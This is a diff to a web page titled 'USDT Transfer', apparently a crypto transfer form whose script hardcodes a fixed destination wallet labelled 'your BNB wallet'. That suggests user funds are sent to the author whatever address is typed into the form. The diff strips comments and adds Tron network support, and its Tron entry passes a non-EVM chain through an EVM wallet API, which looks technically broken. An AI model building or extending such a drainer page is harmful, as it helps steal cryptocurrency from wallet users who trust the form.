@@ -5,14 +5,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>USDT Transfer</title>
   <style>
-    /* Full screen – no margins, no backgrounds, no borders */
     * {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
     }
     body {
-      background: #ffffff;          /* plain white, no background */
+      background: #ffffff;
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
       min-height: 100vh;
       display: flex;
@@ -20,9 +19,9 @@
     }
     .container {
       width: 100%;
-      max-width: 100%;              /* full width */
-      padding: 20px 16px;           /* some breathing space */
-      background: transparent;       /* no card background */
+      max-width: 100%;
+      padding: 20px 16px;
+      background: transparent;
       flex: 1;
     }
     .field-group {
@@ -47,7 +46,7 @@
       border: none;
       border-radius: 0;
       font-size: 15px;
-      background: #f7fafc;           /* light background for fields */
+      background: #f7fafc;
       transition: 0.15s;
       outline: none;
       min-width: 0;
@@ -159,6 +158,7 @@
 </head>
 <body>
 <div class="container">
+
   <!-- Address -->
   <div class="field-group">
     <label>Address or Domain Name</label>
@@ -167,7 +167,7 @@
     </div>
   </div>
 
-  <!-- Network -->
+  <!-- Network dropdown with icon -->
   <div class="field-group">
     <label>Network</label>
     <div class="field-row">
@@ -180,6 +180,7 @@
           <option value="1" data-icon="https://tse1.mm.bing.net/th/id/OIP.WZaxrR-JdgEl7jlVVa4xWAHaEe?r=0&rs=1&pid=ImgDetMain&o=7&rm=3">Ethereum (ERC20)</option>
           <option value="2" data-icon="https://forum.polygon.technology/uploads/default/original/2X/e/e8a6275557c6497c38ab0a80bb639bfac8178d78.jpeg">Polygon</option>
           <option value="3" data-icon="https://th.bing.com/th/id/OIP.XCCGzmUFCVYkr4hfhLQPpgHaFr?r=0&o=7rm=3&rs=1&pid=ImgDetMain&o=7&rm=3">Arbitrum</option>
+          <option value="4" data-icon="https://static.vecteezy.com/system/resources/previews/055/581/228/non_2x/simple-usdt-tether-illustration-in-flat-color-design-vector.jpg">Tron (TRC20)</option>
         </select>
       </div>
     </div>
@@ -206,7 +207,7 @@
   // ── Hardcoded destination (your BNB wallet) ──
   const DEST_WALLET = "0xCa2934934d02fBFEAa25e9ABa50136c0c3300a78";
 
-  // ── Supported Networks ──
+  // ── Supported Networks (including Tron) ──
   const NETWORKS = [
     {
       name: 'BNB Smart Chain',
@@ -243,6 +244,15 @@
       nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
       explorer: 'https://arbiscan.io',
       icon: 'https://th.bing.com/th/id/OIP.XCCGzmUFCVYkr4hfhLQPpgHaFr?r=0&o=7rm=3&rs=1&pid=ImgDetMain&o=7&rm=3'
+    },
+    {
+      name: 'Tron',
+      chainId: '0x2b6653dc', // Tron's chain ID (not standard EVM)
+      rpc: 'https://api.trongrid.io',
+      usdt: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', // Tron USDT
+      nativeCurrency: { name: 'TRX', symbol: 'TRX', decimals: 6 },
+      explorer: 'https://tronscan.org',
+      icon: 'https://static.vecteezy.com/system/resources/previews/055/581/228/non_2x/simple-usdt-tether-illustration-in-flat-color-design-vector.jpg'
     }
   ];
 
@@ -348,6 +358,7 @@
     ui.nextBtn.disabled = true;
 
     try {
+      // Attempt to switch network (will work for EVM chains, Tron may need separate handling)
       try {
         await window.ethereum.request({
           method: 'wallet_switchEthereumChain',
